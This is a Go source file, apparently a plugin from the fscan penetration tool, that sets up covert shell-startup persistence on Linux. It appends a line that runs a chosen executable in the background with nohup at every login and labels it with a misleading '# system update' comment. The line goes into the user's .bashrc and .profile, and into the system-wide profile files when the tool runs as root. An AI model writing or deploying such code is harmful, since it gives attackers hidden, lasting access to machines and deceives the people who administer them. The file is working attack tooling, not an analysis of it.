//go:build (plugin_bashrc || !plugin_selective) && !windows && !no_local

package local

import (
	"context"
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"strings"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
)

type BashRCPlugin struct {
	plugins.BasePlugin
}

func NewBashRCPlugin() *BashRCPlugin {
	return &BashRCPlugin{BasePlugin: plugins.NewBasePlugin("bashrc")}
}

func (p *BashRCPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
	pePath := session.Config.PersistenceTargetFile
	if pePath == "" {
		return &plugins.Result{Success: false, Error: fmt.Errorf("未指定持久化文件，使用 -persistence-file 参数")}
	}
	if _, err := os.Stat(pePath); err != nil {
		return &plugins.Result{Success: false, Error: fmt.Errorf("文件不存在: %s", pePath)}
	}

	absPath, _ := filepath.Abs(pePath)
	payload := fmt.Sprintf("\n(nohup %s &>/dev/null &) # system update\n", absPath)

	targets := []struct {
		path string
		desc string
	}{
		{filepath.Join(homeDir(), ".bashrc"), "~/.bashrc"},
		{filepath.Join(homeDir(), ".profile"), "~/.profile"},
	}

	if os.Getuid() == 0 {
		targets = append(targets,
			struct{ path, desc string }{"/etc/profile", "/etc/profile"},
			struct{ path, desc string }{"/etc/bash.bashrc", "/etc/bash.bashrc"},
		)
	}

	var output strings.Builder
	var successCount int

	for _, t := range targets {
		if _, err := os.Stat(t.path); err != nil {
			continue
		}
		data, err := os.ReadFile(t.path)
		if err != nil {
			continue
		}
		if strings.Contains(string(data), absPath) {
			output.WriteString(fmt.Sprintf("[跳过] %s: 已存在\n", t.desc))
			continue
		}
		f, err := os.OpenFile(t.path, os.O_APPEND|os.O_WRONLY, 0644)
		if err != nil {
			output.WriteString(fmt.Sprintf("[失败] %s: %v\n", t.desc, err))
			continue
		}
		_, err = f.WriteString(payload)
		f.Close()
		if err != nil {
			output.WriteString(fmt.Sprintf("[失败] %s: %v\n", t.desc, err))
			continue
		}
		output.WriteString(fmt.Sprintf("[成功] %s\n", t.desc))
		successCount++
	}

	if successCount > 0 {
		common.LogSuccess(i18n.Tr("bashrc_success", successCount))
	}

	return &plugins.Result{
		Success: successCount > 0,
		Type:    plugins.ResultTypeService,
		Output:  output.String(),
	}
}

func homeDir() string {
	if u, err := user.Current(); err == nil {
		return u.HomeDir
	}
	return os.Getenv("HOME")
}

func init() {
	RegisterLocalPlugin("bashrc", func() Plugin {
		return NewBashRCPlugin()
	})
}
